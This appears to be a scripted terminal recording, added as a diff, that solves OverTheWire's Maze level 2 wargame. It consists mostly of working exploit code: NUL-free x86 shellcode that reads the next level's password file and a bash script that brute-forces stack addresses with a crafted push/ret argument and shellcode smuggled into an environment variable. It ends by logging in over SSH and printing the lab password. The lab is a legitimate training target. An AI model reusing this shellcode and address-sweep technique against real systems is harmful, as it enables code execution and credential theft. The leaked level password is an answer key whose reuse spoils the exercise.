@@ -1,0 +1,100 @@
+@line id
+@waitfor uid=15002 
+@line file /maze/maze2
+@sleep 3
+@line readelf -l /maze/maze2 | grep -A1 GNU_STACK
+@sleep 3
+@line objdump -d /maze/maze2 | sed -n '/<main>:/,/ret/p'
+@sleep 4
+@line md5sum /maze/maze2
+@sleep 3
+@line cd /tmp; rm -rf l2exp; mkdir l2exp; chmod 755 l2exp; cd l2exp
+@sleep 2
+@vi sc.asm
+BITS 32
+; maze L2 shellcode: open("/etc////maze_pass//maze3") + read + write(fd1)
+; + write(fd2) + exit. The //// and // keep every dword NUL-free; the
+; canonical path is unchanged. Path dwords are pushed in reverse chunk
+; order so the stack holds the string forwards. Every encoding is
+; NUL-free (sub esp uses the imm8 form) so the code can ride in an
+; environment variable.
+global _start
+_start:
+  xor eax, eax
+  push eax                 ; NUL terminator
+  push 0x33657a61          ; 'aze3'
+  push 0x6d2f2f73          ; 's//m'
+  push 0x7361705f          ; '_pas'
+  push 0x657a616d          ; 'maze'
+  push 0x2f2f2f2f          ; '////'
+  push 0x6374652f          ; '/etc'
+  mov ebx, esp             ; ebx = path
+  xor ecx, ecx             ; O_RDONLY
+  mov al, 5
+  int 0x80                 ; open()
+  mov ebx, eax             ; fd
+  sub esp, 0x7f            ; scratch buffer (imm8 form: no NUL bytes)
+  mov ecx, esp             ; buffer on stack
+  xor edx, edx
+  mov dh, 0x20             ; count 0x2000
+  mov al, 3
+  int 0x80                 ; read()
+  mov edx, eax             ; bytes read
+  xor ebx, ebx
+  inc ebx                  ; fd 1
+  mov al, 4
+  int 0x80                 ; write(1)
+  mov al, 4
+  inc ebx                  ; fd 2
+  int 0x80                 ; write(2)
+  xor eax, eax
+  xor ebx, ebx
+  mov al, 1
+  int 0x80                 ; exit
+@viend
+@sleep 2
+@line nasm -f bin sc.asm -o sc.bin && ls -l sc.bin
+@sleep 4
+@vi sweep.sh
+#!/bin/bash
+# maze L2 sweep: strncpy(buf[12], argv[1], 8) then calls fp=&buf.
+# argv[1] = '\x68' + target(LE) + '\xc3' + 'AA' - push imm32(target);
+# ret, padded to the 8 bytes strncpy copies. The shellcode rides env
+# P = 2000 A's + sc.bin (NOP sled absorbs the layout uncertainty).
+# Stage 1 sweeps the known-hit window (0xffffd6d0-0xffffd720); stage 2
+# is the wider fallback 0xffffd000-0xffffe000.
+P=$(printf 'A%.0s' $(seq 2000))$(cat sc.bin)
+sweep() {
+  lo=$1; hi=$2
+  for t in $(seq $lo 4 $hi); do
+    T=$(printf '%08x' $t)
+    case "$T" in *00*) continue;; esac
+    A=$(printf "\\x68\\x${T:6:2}\\x${T:4:2}\\x${T:2:2}\\x${T:0:2}\\xc3AA")
+    out=$(P="$P" /maze/maze2 "$A" 2>&1 </dev/null)
+    if [ -n "$out" ]; then echo "HIT at 0x$T"; printf '%s' "$out"; return 0; fi
+  done
+  return 1
+}
+if sweep $((0xffffd6d0)) $((0xffffd720)); then
+  echo SWEEPDONE
+  exit 0
+fi
+echo "stage1 miss, widening..."
+sweep $((0xffffd000)) $((0xffffe000))
+echo SWEEPDONE
+@viend
+@sleep 2
+@line chmod +x sweep.sh && cat sweep.sh
+@sleep 3
+@nowait ./sweep.sh
+@waitfor HIT -
+@sleep 3
+@line exit
+@sleep 2
+@nowait ssh -o StrictHostKeyChecking=accept-new -o PreferredAuthentications=password -o PubkeyAuthentication=no -p 2225 maze3@maze.labs.overthewire.org
+@waitfor password: pKWcO3NfC6
+@waitfor maze3@maze:~$ id
+@waitfor uid=15003 
+@line cat /etc/maze_pass/maze3
+@waitfor pKWcO3NfC6 
+@sleep 1
